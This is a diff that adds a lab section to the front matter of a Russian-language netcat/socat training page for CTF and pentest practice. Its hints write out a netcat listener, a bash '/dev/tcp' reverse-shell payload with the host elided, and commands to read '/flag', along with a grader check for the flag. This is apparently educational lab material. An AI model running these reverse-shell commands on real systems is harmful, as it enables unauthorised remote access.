@@ -14,6 +14,18 @@ useful_for:
   - "Внутренний пентест и pivoting"
 estimated_minutes: 40
 summary: "Практический справочник по netcat и socat: слушатели, reverse/bind shell, передача файлов, HTTP руками, порт-скан, релеи и туннели для CTF и пентеста."
+lab:
+  kind: shell
+  title: "Практика: reverse shell через netcat"
+  toolset: [core, nc, socat]
+  workdir: /home/student/task
+  files: [task.md, shell.sh]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - "Подними слушатель: `nc -lvnp 4444` (в лабе — эмуляция сессии)."
+    - "Payload обратной оболочки лежит в `shell.sh` (`bash -i >& /dev/tcp/...`)."
+    - "Слушатель примет соединение и даст оболочку `www-data`."
+    - "Прочитай флаг (`cat /flag`) и сохрани сессию: `nc -lvnp 4444 > found.txt`, затем `check`."
 ---
 
 ## Задача
